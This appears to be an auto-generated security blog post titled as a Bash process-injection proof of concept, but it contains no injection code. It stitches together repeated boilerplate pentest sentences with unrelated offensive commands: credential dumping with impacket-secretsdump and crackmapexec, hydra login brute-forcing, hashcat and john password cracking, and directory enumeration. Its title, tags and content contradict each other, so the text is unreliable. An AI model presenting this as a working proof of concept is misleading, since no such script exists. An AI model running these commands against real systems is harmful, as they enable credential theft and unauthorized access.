---
TitleSEO: "Process Injection PoC in Bash | ZureFX"
TitlePost: "Process Injection PoC — Bash"
Author: "ZureFX"
Description: "A Bash script for process injection poc. Built for security research and automation."
Keywords: "parser, tool, python, automation, bash"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-424.html"
URL_IMAGES: ""
Date: "2024-08-03"
Tags: "Parser, Tool, Python, Automation, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-424"
Permalink: "/scripting/script-process-injection-poc-424.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `bloodhound`
- `hydra`
- `nmap`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.95.232
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.48.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.25.61.102 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.51.192.242/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.127.127.253 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.192.49
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 7.52s
```
